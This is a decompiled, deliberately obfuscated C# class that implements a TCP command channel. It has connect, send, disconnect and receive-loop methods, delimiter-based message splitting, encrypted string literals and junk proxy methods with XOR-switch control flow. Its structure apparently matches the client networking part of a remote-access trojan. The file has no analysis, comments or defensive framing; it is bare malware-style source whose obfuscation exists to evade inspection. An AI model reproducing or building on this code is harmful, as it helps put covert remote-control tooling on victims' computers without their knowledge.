using System;
using System.Collections;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.Layout;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace O;

public class GClass1
{
	public delegate void ConnectedEventHandler();

	public delegate void DataEventHandler(byte[] b);

	public delegate void DisconnectedEventHandler();

	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 4142)]
	private struct Struct1
	{
	}

	private DataEventHandler dataEventHandler_0;

	private DisconnectedEventHandler disconnectedEventHandler_0;

	private ConnectedEventHandler connectedEventHandler_0;

	private static readonly Array array_0;

	private static readonly Array array_1;

	private static readonly object object_0;

	internal static byte byte_0/* Not supported: data(00) */;

	private Class19.Class22.Class23.Class24 class24_0 = new Class19.Class22.Class23.Class24();

	internal TcpClient tcpClient_0;

	public event _0ACDસ Event_0
	{
		add
		{
			DataEventHandler dataEventHandler = (DataEventHandler)(MulticastDelegate)dataEventHandler_0;
			DataEventHandler dataEventHandler2;
			do
			{
				dataEventHandler2 = dataEventHandler;
				DataEventHandler value2 = (DataEventHandler)Delegate.Combine(dataEventHandler2, value);
				dataEventHandler = (DataEventHandler)(MulticastDelegate)Interlocked.CompareExchange(ref dataEventHandler_0, value2, dataEventHandler2);
			}
			while ((object)dataEventHandler != dataEventHandler2);
		}
		remove
		{
			DataEventHandler dataEventHandler = dataEventHandler_0;
			DataEventHandler dataEventHandler2;
			do
			{
				dataEventHandler2 = dataEventHandler;
				DataEventHandler value2 = (DataEventHandler)Delegate.Remove(dataEventHandler2, value);
				dataEventHandler = Interlocked.CompareExchange(ref dataEventHandler_0, value2, dataEventHandler2);
			}
			while ((object)dataEventHandler != dataEventHandler2);
		}
	}

	public event ગ Event_1
	{
		add
		{
			DisconnectedEventHandler disconnectedEventHandler = (DisconnectedEventHandler)(MulticastDelegate)disconnectedEventHandler_0;
			DisconnectedEventHandler disconnectedEventHandler2;
			do
			{
				disconnectedEventHandler2 = disconnectedEventHandler;
				DisconnectedEventHandler value2 = (DisconnectedEventHandler)Delegate.Combine(disconnectedEventHandler2, value);
				disconnectedEventHandler = (DisconnectedEventHandler)(MulticastDelegate)Interlocked.CompareExchange(ref disconnectedEventHandler_0, value2, disconnectedEventHandler2);
			}
			while ((object)disconnectedEventHandler != disconnectedEventHandler2);
		}
		remove
		{
			DisconnectedEventHandler disconnectedEventHandler = (DisconnectedEventHandler)(MulticastDelegate)disconnectedEventHandler_0;
			DisconnectedEventHandler disconnectedEventHandler2;
			do
			{
				disconnectedEventHandler2 = disconnectedEventHandler;
				DisconnectedEventHandler value2 = (DisconnectedEventHandler)Delegate.Remove(disconnectedEventHandler2, value);
				disconnectedEventHandler = (DisconnectedEventHandler)(MulticastDelegate)Interlocked.CompareExchange(ref disconnectedEventHandler_0, value2, disconnectedEventHandler2);
			}
			while ((object)disconnectedEventHandler != disconnectedEventHandler2);
		}
	}

	public event વ Event_2
	{
		add
		{
			ConnectedEventHandler connectedEventHandler = connectedEventHandler_0;
			ConnectedEventHandler connectedEventHandler2;
			do
			{
				connectedEventHandler2 = connectedEventHandler;
				ConnectedEventHandler value2 = (ConnectedEventHandler)Delegate.Combine(connectedEventHandler2, value);
				connectedEventHandler = Interlocked.CompareExchange(ref connectedEventHandler_0, value2, connectedEventHandler2);
			}
			while ((object)connectedEventHandler != connectedEventHandler2);
		}
		remove
		{
			ConnectedEventHandler connectedEventHandler = (ConnectedEventHandler)(MulticastDelegate)connectedEventHandler_0;
			ConnectedEventHandler connectedEventHandler2;
			do
			{
				connectedEventHandler2 = connectedEventHandler;
				ConnectedEventHandler value2 = (ConnectedEventHandler)Delegate.Remove(connectedEventHandler2, value);
				connectedEventHandler = (ConnectedEventHandler)(MulticastDelegate)Interlocked.CompareExchange(ref connectedEventHandler_0, value2, connectedEventHandler2);
			}
			while ((object)connectedEventHandler != connectedEventHandler2);
		}
	}

	public GClass1()
	{
		string string_ = Conversions.ToString(method_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue047\ue05b\ue049\ue045\ue049\ue025\ue05d\ue049\ue05d", 63574), 61416), 63344), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﮉﮋﮊﮖ\ufbb4ﮛﮭﮫﮏﮠﮛﮩﮇﮐﮙﮰﮨﮒﮛ\ufbb6ﮕ\ufbb4ﮗ", 60272), 62191), 57993)));
		class24_0.string_0 = string_;
		class24_0.bool_0 = false;
	}

	private object method_0(string string_0, string string_1)
	{
		string text = "";
		int num = GClass2.DRV.smethod_1(string_1, 802, 895);
		checked
		{
			short num2 = (short)GForm1.smethod_3(string_0, 445, 489);
			for (short num3 = 1; num3 <= num2; num3 = (short)unchecked(num3 + 1))
			{
				text = smethod_3(text, smethod_2(Class12.smethod_3(num ^ GClass2.DRV.smethod_1(smethod_1(string_0, num3, 1, 22, 83), 54, 107), 858, 788), 400, 'Ƃ'), 795, 862);
			}
			return text;
		}
	}

	private void method_1()
	{
		class24_0.bool_0 = true;
		MemoryStream memoryStream = new MemoryStream();
		int num = 0;
		checked
		{
			while (true)
			{
				Class11.smethod_4(1, 'ˠ', 688);
				try
				{
					if (tcpClient_0 == null || !GClass2.DRV.smethod_2(GForm1.smethod_4(tcpClient_0, 960, 1022), 774, '\u0345'))
					{
						break;
					}
					num++;
					if (num > 100)
					{
						num = 0;
						try
						{
							if (GForm1.smethod_5(GForm1.smethod_4(tcpClient_0, 424, 406), -1, SelectMode.SelectRead, 82, ' ') & (Class14.smethod_4(GForm1.smethod_4(tcpClient_0, 847, 881), 'Û', 'ù') <= 0))
							{
								break;
							}
						}
						catch (Exception gparam_)
						{
							GForm1.smethod_6(gparam_, 'ȩ', 526);
							Class5.smethod_4('Ŋ', 319);
							goto end_IL_0019;
						}
					}
					if (GClass2.DRV.smethod_3(tcpClient_0, 943, 955) <= 0)
					{
						continue;
					}
					byte[] array = new byte[GClass2.DRV.smethod_3(tcpClient_0, 961, 981) - 1 + 1];
					GForm1.smethod_4(tcpClient_0, 696, 646).Receive(array, 0, array.Length, SocketFlags.None);
					Class4.smethod_1(memoryStream, array, 0, array.Length, 24, 1);
					while (true)
					{
						byte[] array2 = Class11.smethod_8(memoryStream, 'ɀ', 631);
						if (Class2.smethod_8(ref array2).Contains(class24_0.string_0))
						{
							Array array3 = Class2.smethod_0(Class11.smethod_8(memoryStream, 'ɞ', 617), class24_0.string_0);
							((DataEventHandler)(MulticastDelegate)dataEventHandler_0)?.Invoke((byte[])GForm1.smethod_9((object)array3, new object[1] { 0 }, (string[])null, (short)816, 768));
							Class12.smethod_7((Stream)memoryStream, (short)741, 726);
							memoryStream = new MemoryStream();
							if (array3.Length == 2)
							{
								memoryStream.Write((byte[])NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null), (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue602\ue60b\ue600\ue609\ue61a\ue606", 59206), 60480), 60743), new object[0], (string[])null, (Type[])null, (bool[])null)));
								Thread.Sleep(1);
								continue;
							}
							break;
						}
						break;
					}
					continue;
					end_IL_0019:;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				break;
			}
			class24_0.bool_0 = false;
			DisConnect();
		}
	}

	public void Send(byte[] b)
	{
		try
		{
			MemoryStream gparam_ = new MemoryStream();
			Class4.smethod_1(gparam_, b, 0, b.Length, 487, 510);
			Class4.smethod_1(gparam_, Class2.smethod_7(ref class24_0.string_0), 0, GClass2.DRV.smethod_1(class24_0.string_0, 911, 977), 339, 330);
			GForm1.smethod_4(tcpClient_0, 222, 224).Send(Class11.smethod_8(gparam_, '.', 25), 0, checked((int)smethod_4(gparam_, 'Ý', 211)), SocketFlags.None);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			DisConnect();
			ProjectData.ClearProjectError();
		}
	}

	public void Send(string s)
	{
		Send(Class2.smethod_7(ref s));
	}

	public void DisConnect()
	{
		try
		{
			Class14.smethod_5(tcpClient_0, 'ĝ', 364);
		}
		catch (Exception gparam_)
		{
			GForm1.smethod_6(gparam_, '\u036d', 842);
			Class5.smethod_4('Ő', 293);
		}
		TcpClient tcpClient = (tcpClient_0 = null);
		disconnectedEventHandler_0?.Invoke();
	}

	public void Connect(string h, int p)
	{
		try
		{
			try
			{
				if (tcpClient_0 != null)
				{
					Class14.smethod_5(tcpClient_0, '\u032a', 859);
					TcpClient tcpClient = (tcpClient_0 = null);
				}
			}
			catch (Exception gparam_)
			{
				GForm1.smethod_6(gparam_, '\u0360', 839);
				Class5.smethod_4('Ȝ', 617);
			}
			while (class24_0.bool_0)
			{
				Class11.smethod_4(1, '\u0005', 85);
			}
			try
			{
				TcpClient tcpClient2 = (tcpClient_0 = new TcpClient());
				Class4.smethod_3(tcpClient_0, h, p, 976, 931);
				smethod_5(new Thread(method_1, 10), 741, 642);
				((ConnectedEventHandler)(MulticastDelegate)connectedEventHandler_0)?.Invoke();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			((DisconnectedEventHandler)(MulticastDelegate)disconnectedEventHandler_0)?.Invoke();
			ProjectData.ClearProjectError();
		}
	}

	public bool Statconnected()
	{
		try
		{
			if (GClass2.DRV.smethod_2(GForm1.smethod_4(tcpClient_0, 566, 520), 540, 'ɟ'))
			{
				return true;
			}
			return false;
		}
		catch (Exception gparam_)
		{
			GForm1.smethod_6(gparam_, 'Ǵ', 467);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static GClass1()
	{
		array_1 = new char[2071];
		char[] array = new char[8];
		array[0] = 'ὶ';
		array[3] = '㏵';
		array[6] = '\u17ee';
		array[4] = '㾶';
		array[7] = '㰎';
		array[5] = 'ʛ';
		array[2] = '〣';
		array[1] = 'Ề';
		object_0 = new string[168];
		array_0 = array;
	}

	internal static object smethod_0<T, U>(T gparam_0, U gparam_1, short short_0, int int_0)
	{
		int num = 0;
		object result = (((short_0 ^ int_0) - 15) ^ 0) switch
		{
			0 => Operators.ConcatenateObject((object)gparam_0, (object)gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_1<T>(T gparam_0, int int_0, int int_1, int int_2, int int_3) where T : string
	{
		int num = 0;
		string result = (((int_3 ^ int_2) - 69) ^ 0) switch
		{
			0 => Strings.Mid((string)gparam_0, int_0, int_1), 
			1 => gparam_0.Remove(int_0, int_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_2(char char_0, short short_0, char char_1)
	{
		int num = 0;
		string result = (((short_0 ^ char_1) - 18) ^ 0) switch
		{
			0 => Conversions.ToString(char_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_3<T, U>(U gparam_0, T gparam_1, int int_0, int int_1) where T : string where U : string
	{
		int num = 0;
		string result = (((int_1 ^ int_0) - 69) ^ 0) switch
		{
			0 => (string)(IEnumerable)string.Concat(gparam_0, gparam_1), 
			1 => (string)(IEnumerable)string.Concat(gparam_0, gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static long smethod_4<T>(T gparam_0, char char_0, int int_0) where T : MemoryStream
	{
		int num = 0;
		long result = (((char_0 ^ int_0) - 14) ^ 0) switch
		{
			0 => gparam_0.Length, 
			_ => 10L, 
		};
		num++;
		return result;
	}

	internal static void smethod_5<T>(T gparam_0, short short_0, int int_0) where T : Thread
	{
		int num = 0;
		int num2;
		do
		{
			switch (((int_0 ^ short_0) - 103) ^ num)
			{
			case 0:
				gparam_0.Start();
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static object smethod_6<T>(IntPtr intptr_0, T gparam_0, int int_0, short short_0) where T : Type
	{
		int num = 0;
		object result = (((short_0 ^ int_0) - 25) ^ 0) switch
		{
			0 => Marshal.PtrToStructure(intptr_0, (Type)gparam_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static ControlCollection smethod_7<T>(T gparam_0, int int_0, char char_0) where T : Control
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		int num = 0;
		ControlCollection result;
		do
		{
			result = (ControlCollection)((((int_0 ^ char_0) - 116) ^ num) switch
			{
				0 => (object)(ArrangedElementCollection)((Control)gparam_0).get_Controls(), 
				_ => null, 
			});
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}
}
